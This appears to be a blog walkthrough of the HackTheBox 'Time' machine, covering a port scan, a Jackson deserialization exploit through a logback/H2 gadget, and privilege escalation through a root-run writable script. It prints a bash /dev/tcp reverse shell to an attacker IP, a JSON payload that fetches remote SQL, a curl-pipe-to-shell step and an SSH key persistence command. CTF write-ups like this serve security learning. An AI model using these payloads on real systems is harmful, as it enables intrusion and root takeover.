---
title: " HackTheBox {Time}"
description: Walkthrough of the Time Machine on Hackthebox.
---
![Time](https://media.discordapp.net/attachments/490431433559506954/832933487954231336/screenshot-193.png)

![r](https://cdn.discordapp.com/attachments/519930659620257797/832739076687134800/68747470733a2f2f692e696d6775722e636f6d2f344d37495777502e676966.gif)

## 0x1 - Scanning port

```sh
PORT STATE SERVICE VERSION 
22/tcp open ssh  OpenSSH 8.2p1 Ubuntu 4ubuntu (Ubuntu Linux;
protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that there is the ssh/22 port and the 80 / http port which are open.

We are going to see the http/80 port to see what is interesting.

We see an online json beautifier & Validator with 2 options, "Beatify" & "Validate!(Beta)".

![A](https://media.discordapp.net/attachments/490431433559506954/832936431823224862/unknown.png)

I intercepted both options in burpsuite and i have just input sample JSON datain the input field, select Beautify option and click on the PROCESS button. We can see this working. 
Now try the same on "Validate! (Beta)" options : 

![a](https://media.discordapp.net/attachments/490431433559506954/832954307493756969/unknown.png)

You got an error ! 
```
Validation failed: Unhandled Java exception:com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object
```


## 0x2 - Foothold

I pasted the error message: ```Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object``` on google, I came across an article from stackoverflow.  <a href="https://stackoverflow.com/questions/26251486/jackson-polymorphic-deserialization-expected-start-array">here article</a>

The error is related to Jackson Polymorphic Deserialization expected START_ARRAY.

Now, you need to create a inject.sql files and add a reverse shell to have it call back to me. :

```sh
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
```

Now, start a netcat listener :

```sh
nc -nvlp 1337
listening on [any] 1337 ...
```

Now inject the payload to : "Validate!(Beta)".

```sh
[“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/inject.sql'”}]
```

and you got a reverseshell running as the user pericles.

```sh
listening on [any] 1337 ...
connect to [10.10.14.90] from (UNKNOWN) [10.10.10.214] 42212
```

Now for a good stable shell, type :

```sh
$python -c “import pty;pty.spawn(‘/bin/bash’)”
$export TERM=xterm
```
Got the user flag : 

```
pericles@time:/home/pericles$ cat user.txt 
cat user.txt
7u7243a41d508868b8c935c47b554ad7
```
## 0x3 - Privilege Escalation

Try to upload linpeas ( LinPEAS is a script that search for possible paths to escalate privileges on Linux )

Install linpeas <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>

Start python server where are your linpeas.sh file and curl to the target machine.

```
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

We can see that root has been accessing this file: “/usr/bin/timer_backup.sh”. Which is owned by your user and writeable.

![ak](https://media.discordapp.net/attachments/490431433559506954/832944544067878932/unknown.png)

You need to create your ssh key, add our SSH public key to the authorized_keys file on the server. To do this follow commands :

```sh
ssh-keygen
( no passphrase ) 
Copy your id_rsa.pub key 
and paste this command in target machine : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```

Now just : ```chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214```

Done ! 

```sh
root@time:~# whoami
root
root@time:~# id
uid=0(root) gid=0(root) groups=0(root) 
```

Got the root flag 

```sh
root@time:~# cat /root/root.txt
adsd9hf0c86b8786477033415e3018a4
```
##  Summary Of Knowledge : 

- Java Deserialization
- System Timer Exploitation

## About me :

- Post author : x0ld
- Github : https://github.com/x0ld
- Twitter : @x0ld7

![ak](https://www.hackthebox.eu/badge/image/491690)

